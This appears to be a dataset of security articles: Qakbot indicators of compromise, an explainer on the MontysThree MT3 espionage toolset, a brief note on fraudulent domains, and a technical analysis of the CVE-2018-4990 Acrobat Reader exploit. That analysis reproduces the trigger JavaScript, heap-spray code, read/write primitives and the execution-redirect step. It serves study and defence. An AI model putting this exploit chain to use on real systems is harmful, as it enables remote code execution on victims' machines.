cc9941784371880ed99ee0904c901266fad3074f34d302233f0741cfe6657eb6 e04b52d40866c70df0634266dc8e650712c30f39d69d44a2c38ff65e4948c8bd e2e8b6db48528177a29181418fba40d1c836ede4617159f55a0e96f9fe0ec984 ed62393540e6672d74dab74381427a334a1d64b7a0425d6a91fb6ea6141221e7 efe642fd78561c05dfc2b3d63235d91a3c8b56345249632eefebcc4a5feab3db f7ac29e25c12c504e255e45e507391d9a0cdbbcbc338c5dc0fd596afbc35deee Coverage Product Protection Secure Endpoint Cloudlock N/A CWS Email Security Network Security N/A Stealthwatch N/A Stealthwatch Cloud N/A Secure Malware Analytics Umbrella N/A WSA N/A Screenshots of Detection Secure Endpoint Secure Malware Analytics MITRE ATT&CK Win.Trojan.Qakbot-9972834-1 Indicators of Compromise IOCs collected from dynamic analysis of 28 samples Registry Keys Occurrences <HKCU>\SOFTWARE\MICROSOFT\DFWOFIK 27 <HKCU>\SOFTWARE\MICROSOFT\DFWOFIK Value Name: bd63ad6b 27 <HKCU>\SOFTWARE\MICROSOFT\DFWOFIK Value Name: bf228d17 27 <HKCU>\SOFTWARE\MICROSOFT\DFWOFIK Value Name: 79eea72 27 <HKCU>\SOFTWARE\MICROSOFT\DFWOFIK Value Name: 7a96a5f8 27 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\32\SHELL\{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} Value Name: Sort 1 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\32\SHELL\{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} Value Name: ColInfo 1 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\32\SHELL\{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} Value Name: GroupCollapseState 1 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\32\SHELL\{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} Value Name: GroupView 1 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\32\SHELL\{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} Value Name: GroupByKey:FMTID 1 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\32\SHELL\{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} Value Name: GroupByKey:PID 1 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\32\SHELL\{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} Value Name: GroupByDirection 1 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\73\SHELL\{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} Value Name: Rev 1 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\73\SHELL\{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} Value Name: Vid 1 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\73\SHELL\{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} Value Name: Mode 1 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\73\SHELL\{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} Value Name: LogicalViewMode 1 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\73\SHELL\{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} Value Name: FFlags 1 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\73\SHELL\{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} Value Name: IconSize 1 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\73\SHELL\{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} Value Name: Sort 1 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\73\SHELL\{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} Value Name: ColInfo 1 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\73\SHELL\{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} Value Name: GroupCollapseState 1 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\73\SHELL\{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} Value Name: GroupView 1 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\73\SHELL\{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} Value Name: GroupByKey:FMTID 1 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\73\SHELL\{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} Value Name: GroupByKey:PID 1 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\73\SHELL\{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} Value Name: GroupByDirection 1 Mutexes Occurrences Global\{06253ADC-953E-436E-8695-87FADA31FDFB} 27 {06253ADC-953E-436E-8695-87FADA31FDFB} 27 {357206BB-1CE6-4313-A3FA-D21258CBCDE6} 27 Global\C::Users:Administrator:AppData:Local:Microsoft:Windows:Explorer:iconcache_idx.db!07698 1 Global\{7B79CCF3-2543-4418-9AE3-13A412B9485A} 1 {4D75F9BA-3625-4505-A691-ED1227F4B50E} 1 {7B79CCF3-2543-4418-9AE3-13A412B9485A} 1 Files and or directories created Occurrences %APPDATA%\Microsoft\Xtuou 27 %ProgramFiles%\7-Zip\Lang\mng2.txt 1 %ProgramFiles%\7-Zip\Lang\mr.txt 1 %ProgramFiles%\7-Zip\Lang\ms.txt 1 %ProgramFiles%\7-Zip\Lang\nb.txt 1 %ProgramFiles%\7-Zip\Lang\ne.txt 1 %ProgramFiles%\7-Zip\Lang\nl.txt 1 %ProgramFiles%\7-Zip\Lang\nn.txt 1 %ProgramFiles%\7-Zip\Lang\pa-in.txt 1 %ProgramFiles%\7-Zip\Lang\pl.txt 1 %ProgramFiles%\7-Zip\Lang\ps.txt 1 %ProgramFiles%\7-Zip\Lang\pt-br.txt 1 %ProgramFiles%\7-Zip\Lang\pt.txt 1 %ProgramFiles%\7-Zip\Lang\ro.txt 1 %ProgramFiles%\7-Zip\Lang\ru.txt 1 %ProgramFiles%\7-Zip\Lang\sa.txt 1 %ProgramFiles%\7-Zip\Lang\si.txt 1 %ProgramFiles%\7-Zip\Lang\sk.txt 1 %ProgramFiles%\7-Zip\Lang\sl.txt 1 %ProgramFiles%\7-Zip\Lang\sq.txt 1 %ProgramFiles%\7-Zip\Lang\sr-spc.txt 1 %ProgramFiles%\7-Zip\Lang\sr-spl.txt 1 %ProgramFiles%\7-Zip\Lang\sv.txt 1 %ProgramFiles%\7-Zip\Lang\ta.txt 1 %ProgramFiles%\7-Zip\Lang\th.txt 1 *See JSON for more IOCs File Hashes 0026645145cebe394c4fb8f5bebdf4d3199bff9053ce92c334bcb8b5f66a5832 01e37dcd8e487e821f4267d990296dc3e73fd67a3af4e5be3c11db442acab16a 0c35fa0501b7b4c766ed9de8ba3b23773c2e02c6df5c488e768ac71057816bcf 0ea87d7270f57c9469a357541c0ba167f031438b80381e8e99e4bed9cacb19f3 11b161e294f2be47ebae7d9419868135a0410023eae236076562a3331030dc3c 1521bf5d38a02cae5e2020c1c11216b438793bc4de2498d3564a7f33f334827e 1831e80b0f1fff4282c01d5b8a8e08dc7a05ecdcebb278efbb509706ad369967 18cf23a68ba15d06373314737d6ec8b59199c8ef9af0dccde7150716532baaac 1b5e1690492b71173a2a078ff8a75d66c4a8b11e9617ad360af0452997e14ac9 1c7a2cf4823a32c5b8b9f32fd3a754023497a299c502dce042ded24a0d7fc764 1ff6ab173a9fe5a38a73680b289a4d6fd676ff5d5926ca331d8454bf3fe8afa9 25bdc9afcddff2556eaa821e25e2291381c4f2155fc9122d2e4113ee7a6a2748 2a1dd679211581bfdcdfbe9e0ae692d432a1079443c21d3219a0d72b06aa0046 2f693b3ecf07154d148563aa0525d0521e46f46529ef44bd1d947b3d636f929f 339ee32915a3ced968e781a66caa65dcf0cb614e4cc7990db3a10021d97c5906 36f1ef38bf37a0cb55c1bb8ceab684485f0e306c98b52cb068fb587fc5a2fcf4 38a3d39aa9d88941b7267c2a360872eb201c1d1a8421f5426610b5d6c5152538 3e5174c91dacc54cc6082d45b7253194743e307c7d775574e0100b0860ddbe16 41196d7bdc074db56deca5a0fef682d2cb167628de8907ad0dbd6e7321ff5389 43e05dac1b91b212c4f0da1279e2f8d966b52b04f7e428a6d2b1da3565470914 466484398eb25d42b0e0b095f10590a566610447eb212d1dc7f7bd342e89fe5a 499d168c92421b16b5e91609207cf4c7cc92db93a1d33c63866db77ed0bdac7f 4bbb72953a3ba582f0be37eea5d616f4b63bb0b569eb9589e67cf4152e026f51 4ff872d196dbb0d23c4bc96311372f9b0cd9f8b9ea00fa4b5041fa9ea49a1442 5699d1e398d0d8ffd7d118e67862ef8a048d7057bae8507fc07dca8149cdeab0 *See JSON for more IOCs Coverage Product Protection Secure Endpoint Cloudlock N/A CWS Email Security Network Security N/A Stealthwatch N/A Stealthwatch Cloud N/A Secure Malware Analytics Umbrella N/A WSA N/A Screenshots of Detection Secure Endpoint Secure Malware Analytics MITRE ATT&CK"
c91cb61c-1499-55d2-887c-a762b19b35e5,18-March-2021,ATP group MontysThree uses MT3 toolset in industrial cyberespionage,MontysThree is an advanced threat protection group focused on industrial cyberespionage. The group uses a toolset called MT3 to target specific directories on Cyrillic-language Windows. MontysThree primarily targets corporate industrial entities in Russia and Ukraine.,"The age of cyber spying Targeted malware is often an issue for officials such as diplomats and telecom operators. In rare cases, industries become a target, which is known as industrial cyberespionage. One advanced threat protection (ATP) group, MontysThree, used its MT3 toolset to conduct industrial cyberespionage. This type of espionage is not merely a plot device used in James Bond films or sci-fi novels — it is a real threat in the world today. What is MontysThree? MontysThree is an ATP group in operation since 2018 or earlier. This group is believed to be focused on targets in Russia, and no attacks have yet occurred in the U.S. Targets have only been in Russia or in countries that speak Russian. The MontysThree toolset seeks out directories that are on Cyrillic-localized editions of Windows (Cyrillic is a script used in various nations such as Russia or Ukraine). More to this point, a typical file searched for by its toolset is named Список телефонов сотрудников 2019.doc. This group is considered a hacker collective. MontysThree uses several different techniques to avoid detection, such as steganography and public cloud infrastructures for their command and control (C2) servers. Another example of this group using a smokescreen to hide its presence is the recent implementation of email-based accounts pretending to be Chinese in origin. While still behind other APTs in terms of skill, these techniques contribute to its success. There is also ample evidence that MontysThree is exclusively an industrial cyberespionage group. According to Kaspersky Lab (who uncovered the MT3 toolset), MontysThree primarily steals recent documents, such as Adobe Acrobat and Microsoft Word files, as well as documents stored on removable drives. Plus, MontysThree’s targets are corporate industrial entities, so you can assume to be looking at an industrial cyberespionage APT. What is MT3? MT3 is the name of the multi-module toolset, written in the C++ language, used by MontysThree during its highly targeted attack campaigns. It is initially spread to its victims via targeted spearphishing email campaigns containing malicious files disguised as important files such as contact lists, technical papers and medical documents. Once these documents are opened, the loader uses steganography to conceal malicious code in images such as bitmap file types. The toolset is delivered inside RAR archives, which are self-extracting and native to Windows. MT3 is comprised of four modules: Loader module — This module is what manages the extraction of the malicious code that was hidden with steganography in the image file. The extraction is saved locally to the targeted user’s system as ‘msgslang32.dll’ Kernel module — Responsible for configuration decryption, C2 infrastructure communication (RSA and 3DES keys) and data collection for details like system information and a list of the latest documents HttpTransport Module — This module is responsible for the information exfiltration by both downloading and uploading data using RDP, Citrix, HTTP and WebDAV protocols. These protocols are not part of the module itself. Instead, it exploits the legitimate Windows program on the target system. It can also download data from Google and Dropbox through user tokens. This is possible because no antivirus will block these services, doing the heavy lifting for MT3’s communication with its C2 LinkUpdate — Archives persistence by modifying .lnk files located in Windows Quick launch on the compromised system After an infection Once the malicious file is opened, the payload remains disguised within the image file (bitmap). It then takes a command inputted into the loader before a custom algorithm decrypts the payload from the pixel array. After this occurs, the payload can evade detection with the use of several encryption techniques such as encrypting communications with its C2 by using an RSA algorithm, which is hosted in the cloud. With detection evasion running interception, MT3 then begins its primary purpose of locating certain Adobe Acrobat and Microsoft Word documents. It also steals information about network settings, screenshots, hostnames and other data. Once it has captured the documents and information from the compromised system, it exfiltrates them to the C2 server hosted in the cloud with the use of the HttpTransport module. While performing its dirty work, persistence is achieved by using a Windows Quick Launch modifier. When users of the infected machine run legitimate applications using the Windows Quick Launch Toolbar, they will be inadvertently running the initial MT3 module. MontysThree is here to stay MontysThree is an industrial cyberespionage APT that goes after targets in Russia and the Russian-speaking world. It carries out its cyberespionage campaigns by using its MT3 toolset to locate and steal Adobe Acrobat, Microsoft Word and other information on compromised systems. MontysThree initially infects the system through spearphishing campaigns with malicious scripts hidden within image files such as bitmap. While this group has been identified as being below the skill level of other APT groups, it makes up for this by using several techniques to evade detection and stays persistent in reaching its goal. Sources Industrial Espionage Campaign Uncovered . Bank Info Security UK. MontysThree APT Take Unusual Aim at Industrial Targets . Threat Post. Greg is a Veteran IT Professional working in the Healthcare field. He enjoys Information Security, creating Information Defensive Strategy, and writing – both as a Cybersecurity Blogger as well as for fun."
81ca2aa8-34f0-5013-8fbc-4d7fb65b2263,21-May-2018,"Adobe, Me and an Arbitrary Free :: Analyzing the CVE-2018-4990 Zero-Day Exploit",A zero-day exploit affecting Acrobat Reader was recently patched by Adobe. CVE-2018-4990 is an out-of-bounds read that leads to two arbitrary free conditions. I have updated my analysis of the root cause and exploitation of the bug.,"Update! I originally titled this blog post ‘Adobe, Me and a Double Free’, however as a good friend of mine Ke Liu of Tencent’s Xuanwu LAB pointed out, this vulnerability is actually an out-of-bounds read that leads to two arbitrary free conditions. Therefore I have updated my analysis of the root cause as well as the exploitation. I managed to get my hands on a sample of CVE-2018-4990. This was a zero-day exploit affecting Acrobat Reader that was recently patched by Adobe in apsb18-09 . Anton Cherepanov at ESET wrote a marketing blog post on it ( A tale of two zero-days ) which was a decent , pretty poor analysis and it was missing some important things for me, such as how was the bug actually exploited? TL;DR; I walk through how the attacker(s) exploited CVE-2018-4990 which is an out of bounds read in Acrobat Reader when processing specially crafted JPEG2000 images. Introduction It’s uncommon to see Acrobat Reader exploits in the wild these days so I decided to take a look at this one. All testing was done AcroRd32.exe (c4c6f8680efeedafa4bb7a71d1a6f0cd37529ffc) v2018.011.20035. Other versions are also affected, please see Adobe’s bulletin apsb18-09 for more details. Getting to the root of the vulnerability The first thing I needed to do was uncompress the PDF as many objects are compressed, hiding the true functionaility such as JavaScript and images. I like to use pdf toolkit since it’s command line driven. c:\> pdftk 4b672deae5c1231ea20ea70b0bf091164ef0b939e2cf4d142d31916a169e8e01 output poc.pdf uncompress Since I don’t have an original sample of the JPEG2000 image, I have no idea if this image was bitflipped or not, so I am only going to dive into the JavaScript. After stripping away the rest of the JavaScript, we can see the following code will trigger the out of bounds read: function trigger (){ var f = this . getField ( "" Button1 "" ); if ( f ){ f . display = display . visible ; } } trigger (); The JavaScript comes from an OpenAction triggered from the root node</p> 1 0 obj << /Length 130 >> stream function trigger(){ var f = this.getField(""Button1""); if(f){ f.display = display.visible; } } trigger(); endstream endobj ... 5 0 obj << /Outlines 2 0 R /Pages 3 0 R /OpenAction 6 0 R /AcroForm 7 0 R /Type /Catalog >> endobj 6 0 obj << /JS 1 0 R /Type /Action /S /JavaScript >> endobj ... trailer << /Root 5 0 R /Size 39 >> With page heap and user-mode stack traces enabled, we get the following crash. (a48.1538): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=d0d0d0b0 ebx=00000000 ecx=d0d0d000 edx=d0d0d0b0 esi=020e0000 edi=020e0000 eip=66886e88 esp=0022a028 ebp=0022a074 iopl=0 nv up ei ng nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010286 verifier!AVrfpDphFindBusyMemoryNoCheck+0xb8: 66886e88 813abbbbcdab cmp dword ptr [edx],0ABCDBBBBh ds:0023:d0d0d0b0=???????? 0:000> kv ChildEBP RetAddr Args to Child 0022a074 66886f95 020e1000 d0d0d0d0 020e0000 verifier!AVrfpDphFindBusyMemoryNoCheck+0xb8 (FPO: [SEH]) 0022a098 66887240 020e1000 d0d0d0d0 0022a108 verifier!AVrfpDphFindBusyMemory+0x15 (FPO: [2,5,0]) 0022a0b4 66889080 020e1000 d0d0d0d0 0078d911 verifier!AVrfpDphFindBusyMemoryAndRemoveFromBusyList+0x20 (FPO: [2,3,0]) 0022a0d0 777969cc 020e0000 01000002 d0d0d0d0 verifier!AVrfDebugPageHeapFree+0x90 (FPO: [3,3,0]) 0022a118 77759e07 020e0000 01000002 d0d0d0d0 ntdll!RtlDebugFreeHeap+0x2f (FPO: [SEH]) 0022a20c 777263a6 00000000 d0d0d0d0 387e2f98 ntdll!RtlpFreeHeap+0x5d (FPO: [SEH]) 0022a22c 7595c614 020e0000 00000000 d0d0d0d0 ntdll!RtlFreeHeap+0x142 (FPO: [3,1,4]) 0022a240 5df7ecfa 020e0000 00000000 d0d0d0d0 kernel32!HeapFree+0x14 (FPO: [3,0,0]) *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Program Files\Adobe\Acrobat Reader DC\Reader\JP2KLib.dll - 0022a254 667d0574 d0d0d0d0 7ea9257c 69616fac MSVCR120!free+0x1a (FPO: [Non-Fpo]) (CONV: cdecl) [f:\dd\vctools\crt\crtw32\heap\free.c @ 51] WARNING: Stack unwind information not available. Following frames may be wrong. 0022a374 667e6482 35588fb8 4380cfd8 000000fd JP2KLib!JP2KCopyRect+0xbae6 *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Program Files\Adobe\Acrobat Reader DC\Reader\AcroRd32.dll - 0022a3cc 511d6cfc 36496e88 68d96fd0 4380cfd8 JP2KLib!JP2KImageInitDecoderEx+0x24 0022a454 511d8696 3570afa8 69616fac 3570afa8 AcroRd32_50be0000!AX_PDXlateToHostEx+0x261843 0022a4b4 511cd785 69616fac 0022a4d4 511d6640 AcroRd32_50be0000!AX_PDXlateToHostEx+0x2631dd 0022a4c0 511d6640 69616fac 462f6f70 41826fc8 AcroRd32_50be0000!AX_PDXlateToHostEx+0x2582cc 0022a4d4 50dc030d 69616fac 41826fd0 41826fc8 AcroRd32_50be0000!AX_PDXlateToHostEx+0x261187 0022a510 50dbf92b c0010000 0000000d 41826fc8 AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x7867d 0022a5e0 50dbebc6 0022a988 00000000 60b2d137 AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x77c9b 0022a930 50dbeb88 0022a988 45c3aa50 60b2d163 AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x76f36 0022a964 50dbea71 41826e28 45c3aa50 0022aa1c AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x76ef8 0022a9d0 50dbd949 c0010000 0000000d 45c3aa50 AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x76de1 We can see that the caller to free was JP2KLib!JP2KCopyRect+0xbae6 , let’s dive into that function to see what is happening. We can see that we are actually within a looped operation. The code is looping over an index which is used to read values out of a buffer. The buffer that its trying to read from is size 0x3f4. So if the index is 0xfd we have a read from buffer+(0xfd*0x4) == 0x3f4 which is the first dword out of bounds. Now if the loop continues for one last time (0xfe < 0xff) then we have a second out of bounds read of another dword. Therefore this bug reads 8 bytes out of bounds. If the value that it reads is not null, then the code pushs the out of bounds value as the first argument to sub_10066FEA and calls it. Were going to set a break point just before the caller on the push eax to check what is happening. Breakpoint 1 hit eax=d0d0d0d0 ebx=00000000 ecx=000000fd edx=00000001 esi=33b6cf98 edi=68032e88 eip=667e056e esp=0028a724 ebp=0028a838 iopl=0 nv up ei ng nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000282 JP2KLib!JP2KCopyRect+0xbae0: 667e056e 50 push eax 0:000> bl 0 e 667e056e 0001 (0001) 0:**** JP2KLib!JP2KCopyRect+0xbae0 0:000> dd poi(esi+0x48)+0x4 L1 4732cfe4 000000ff 0:000> r ecx ecx=000000fd We can clearly see that the upper bound is 0xff and the current index is 0xfd. I am unsure if this upper bound value is controllable, the display.visible constant is actually 0. Depending on what sub_10066FEA does with the out of bounds value (eax), will actually determine the exploitability of this bug. But we already know already that it eventually tries to free the first argument. So essentially, this is an out of bounds read that leads to two arbitrary free’s. An interesting sidenote is, that many vulnerabilities are triggered via malformed static content combined with dynamic content accessing and manipulating that malformed content. This type of fuzzing is harder since it requires combined, mutation and generation based fuzzing strategies in a single fuzz iteration. Exploitation So in order to reach the arbitrary free’s though, the attacker needs to perform the following: Load PDF, parse (presumably) a malformed JP2K image inside of a field button. Allocate a large amount of ArrayBuffer’s that are just larger than the buffer that is read out of bounds Set the precise index (which is 249 and 250) with pointers to what the attackers want to free Free every second ArrayBuffer so that the allocation will land in a slot Trigger the bug which actually allocates into a slot and read out of bounds, freeing the two pointers This is what the JavaScript code looks like to so this: var a = new Array ( 0x3000 ); var spraynum = 0x1000 ; var sprayarr = new Array ( spraynum ); var spraylen = 0x10000 - 24 ; var spraybase = 0x0d0e0048 ; var spraypos = 0x0d0f0058 ; // force allocations to prepare the heap for the oob read for ( var i1 = 1 ; i1 < 0x3000 ; i1 ++ ){ a [ i1 ] = new Uint32Array ( 252 ); // these will be freed a1 [ i1 ][ 249 ] = spraybase ; a1 [ i1 ][ 250 ] = spraybase + 0x10000 ; } // heap spray to land ArrayBuffers at 0x0d0e0048 and 0x0d0f0048 for ( var i1 = 1 ; i1 < spraynum ; i1 ++ ){ sprayarr [ i1 ] = new ArrayBuffer ( spraylen ); } // make holes so the oob read chunk lands here for ( var i1 = 1 ; i1 < 0x3000 ; i1 = i1 + 2 ){ delete a [ i1 ]; a [ i1 ] = null ; } Essentially what this code is doing to get the frees: 1. Alloc TypedArray 2. Free TypedArray 3. Alloc from JP2KLib 4. OOB Read + free! +--------------------+ +---------------------+ +---------------------+ +---------------------+ | | | | | +-----------------+ | | +-----------------+ | | | | | | | | | | | | +-----+ | | | | | | | | | | | +---+ | | | +--> | | +--> | |Size: 0x3f4 | | +--> | |Size: 0x3f4 | | | | | | | | | +-----------------+ | | +-----------------+ | | | | +249: 0x0d0e0048 | | +249: 0x0d0e0048 | | +249: 0x0d0e0048 | | +249: 0x0d0e0048 | <-+ | | +250: 0x0d0e0048 | | +250: 0x0d0e0048 | | +250: 0x0d0e0048 | | +250: 0x0d0e0048 | <---+ +--------------------+ +---------------------+ +---------------------+ +---------------------+ Size: 0x400 Size: 0x400 Size: 0x400 Size: 0x400 Size 252 is used because 252 * 4 is 0x3F0. Then if we add the header (0x10) the total is 0x400. This is just enough to allocate 8 bytes over the top of the target buffer to exploit the out of bounds read. So the attackers free two buffers of size 0x10000 which gives them a nice use-after-free condition in JavaScript since they already have references to sprayarr . Since the buffers are sequential, coalescing occurs and the freed buffer becomes size 0x20000. So after the two free’s occur, we are left with the heap in this state. 1. Spray Heap 2. Trigger arbitrary free 3. Trigger arbitrary free 4. Coalesce the 2 chunks +------------------------+ +------------------------+ +------------------------+ +------------------------+ | | | | | | | | | Size: 0x10000 | | Size: 0x10000 | | Size: 0x10000 | | Size: 0x10000 | | | | | | | | | | +--------------+ | | +--------------+ | | +--------------+ | | +--------------+ | | | | | | | | | | | | | | | | | | | Allocated | | | | Allocated | | | | Allocated | | | | Allocated | | | | | | | | | | | | | | | | | | | +--------------+ | | +--------------+ | | +--------------+ | | +--------------+ | | +--------------+ | | +--------------+ | | +--------------+ | | +--------------+ | | | | | | | | | | | | | | | | | | | Allocated | | +--> | | Freed | | +--> | | Freed | |+-- | | Freed | | | | | | | | | | | | | | | | | chunks | | | +--------------+ | | +--------------+ | | +--------------+ | --> | | coalesced | | | +--------------+ | | +--------------+ | | +--------------+ | --> | | size: | | | | | | | | | | | | | | | | | 0x20000 | | | | Allocated | | | | Allocated | | +--> | | Freed | |+-- | | | | | | | | | | | | | | | | | | | | | +--------------+ | | +--------------+ | | +--------------+ | | +--------------+ | | | | | | | | | +------------------------+ +------------------------+ +------------------------+ +------------------------+ Now all the attackers need to do is allocate a TypedArray of size 0x20000 and using the sprayarr reference, find it to overwrite the next ArrayBuffer’s byte length. // reclaims the memory, like your typical use after free for ( var i1 = 1 ; i1 < 0x40 ; i1 ++ ){ sprayarr2 [ i1 ] = new ArrayBuffer ( 0x20000 - 24 ); } // look for the TypedArray that is 0x20000 in size for ( var i1 = 1 ; i1 < spraynum ; i1 ++ ){ if ( sprayarr [ i1 ]. byteLength == 0x20000 - 24 ){ // this is the magic, overwrite the next TypedArray's byte length var biga = new DataView ( sprayarr [ i1 ]); // offset to the byte length in the header biga . setUint32 ( 0x10000 - 12 , 0x66666666 ); // +1 because the next reference as a corrupted length now. if ( sprayarr [ i1 + 1 ]. byteLength == 0x66666666 ){ // game over attackers can read/write out of biga biga = new DataView ( sprayarr [ i1 + 1 ]); ... Now that they know, which TypedArray has a large size ( if( sprayarr[i].byteLength == 0x20000-24) ), they use it to overwrite the byte length of the adjacent ArrayBuffer ( var biga = new DataView(sprayarr[i]); biga.setUint32(0x10000-12,0x66666666); ). Then they just check that the next ArrayBuffer has a matching byte length ( if(sprayarr[i+1].byteLength == 0x66666666) ) and if it does, then they have a relative read/write out of that adjacent ArrayBuffer using a DataView ( biga = new DataView(sprayarr[i+1]); ). At this stage, they need to upgrade this primitive to a full read/write primitive across the whole process space, so they leak a pointer and base address of a TypedArray. var arr = new Array ( 0x10000 ); for ( var i2 = 0x10 ; i2 < 0x10000 ; i2 ++ ) arr [ i2 ] = new Uint32Array ( 1 ); for ( var i2 = 1 ; i2 < 0x10 ; i2 ++ ){ // this is the TypedArray that used for the full read/write primitive arr [ i2 ] = new Uint32Array ( sprayarr [ i1 + i2 ]); // set the index into the first element of the TypedArray // so that the attackers where they are arr [ i2 ][ 0 ] = i2 ; } for ( var i2 = 0x30000 ; i2 < ( 0x10000 * 0x10 ); i2 = i2 + 4 ) { if ( biga . getUint32 ( i2 , true ) == spraylen && biga . getUint32 ( i2 + 4 , true ) > spraypos ){ // save a reference to the relative read/write TypedArray mydv = biga ; // leak the index var itmp = mydv . getUint32 ( i2 + 12 , true ); // get a reference to TypedArray that they overwrite myarray = arr1 [ itmp ]; // get the index where the pointer of the TypedArray is mypos = biga . getUint32 ( i2 + 4 , true ) - spraypos + 0x50 ; // set its byte length to a stupid number also mydv . setUint32 ( mypos - 0x10 , 0x100000 , true ); // leak the pointer of the TypedArray myarraybase = mydv . getUint32 ( mypos , true ); For the full read and write primitives, they overwrite the TypedArray pointer stored in the first element of the arr Array using mypos with the address they want to read/write from, do the read/write and then set the pointer to the TypedArray back to the base address myarraybase . function myread ( addr ){ mydv . setUint32 ( mypos , addr , true ); var res = myarray [ 0 ]; mydv . setUint32 ( mypos , myarraybase , true ); return res ; } function mywrite ( addr , value ){ mydv . setUint32 ( mypos , addr , true ); myarray [ 0 ] = value ; mydv . setUint32 ( mypos , myarraybase , true ); } Naturally, they use some helper functions to use the new read/write primitive. At this point it’s game over. They could have gone with a data only attack but there is no need since Acrobat Reader has no Control Flow Guard (CFG) so they opted for the traditional call gate control flow. First they located the EScript.api and got the dll base address, then they built a rop chain with a dll loader stub, stored it all in the myarray TypedArray overwrote the bookmark object’s execute function pointer with the base address of myarray to finally redirect execution flow. var bkm = this . bookmarkRoot ; var objescript = 0x23A59BA4 - 0x23800000 + dll_base ; objescript = myread ( objescript ); ... mywrite ( objescript , 0x6b707d06 - 0x6b640000 + dll_base ); mywrite ( objescript + 4 , myarraybase ); mywrite ( objescript + 0x598 , 0x6b68389f - 0x6b640000 + dll_base ); // adios! bkm . execute (); Conclusion Adobe Acrobat Reader is still a great target for attackers since JavaScript is so flexible with ArrayBuffers and PDF parsing is so complicated. OS mitigations have very little impact and it’s up to Adobe to opt-in and harden it’s binaries (/GUARD:CF) to make exploitation harder. Had Adobe enabled CFG and developed a form of isolated heap (like they did with flash) then this bug might have been much harder to exploit. As already mentioned, this sample looks like it was still in active development, no obfuscation was done on the JavaScript, but this is very much a throw away bug as I’m sure many other bugs exist in JP2KLib.dll. Nevertheless this was a fantastic bug and an even better exploit! References https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/ https://twitter.com/klotxl404/status/998777393262166017 http://asciiflow.com/"
c549cf30-7e1d-5cdb-9812-08370fb47e42,17-October-2022,Where Domain Security Meets the Supply Chain Crunch,Research from CSC indicates that fraudsters took advantage of 2022 supply chain shortages to target consumers with fake websites. CSC says the baby formula and semiconductor markets have recently experienced shortages. The report shows how companies can improve their security posture.,"New research from CSC indicates that fraudsters took advantage of the 2022 supply chain shortages to target consumers with fake websites. Consumers will go to great lengths to purchase goods in short supply if it’s what they really need. As global and societal events—such as supply chain shortages occur—CSC has observed that there is a corresponding increase in domain registrations that attempt to capitalize on the event. We assessed the baby formula and semiconductor markets as they have both recently experienced supply chain shortages. The report shows that risk increases for companies and consumers experiencing supply chain shortages, and outlines how companies, especially those that supply critical infrastructure, can improve their security posture. To find out the latest trends by industry, and how to protect your brand against the constant barrage of cyber attacks, click here ."
